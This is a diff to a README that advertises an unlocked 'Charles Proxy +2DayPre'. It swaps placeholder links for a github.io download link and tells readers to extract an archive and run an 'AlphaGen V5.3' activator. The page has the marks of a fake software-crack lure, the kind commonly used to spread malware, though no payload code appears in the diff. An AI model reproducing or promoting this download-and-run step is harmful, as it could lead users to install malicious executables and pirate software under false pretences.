@@ -2,13 +2,13 @@
 
 Charles Proxy +2DayPre gives you instant access to professional-grade HTTP/SSL traffic inspection and debugging tools for two days.
 
-[![Download](https://img.shields.io/badge/Download-Charles_2DayPre-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Charles_2DayPre-blueviolet)](https://charles-proxy-2daypre.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://charles-proxy-2daypre.github.io/.github)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate and configure the environment  
 4. ✅ Open Charles Proxy and use all tools in full mode for 2 days
@@ -45,7 +45,7 @@ Charles Proxy +2DayPre gives you instant access to professional-grade HTTP/SSL t
 ### 🖼 Preview
 
 Charles Proxy interface displaying real-time HTTP/SSL traffic logs  
-![Screenshot](https://www.confidenceinterval.com/wp-content/uploads/2019/02/6-Filtering-01-3.png)  
+![Screenshot](PLACE_YOUR_IMAGE_LINK_HERE)  
 *Professional traffic analysis — fully unlocked for 48 hours*
 
 ---
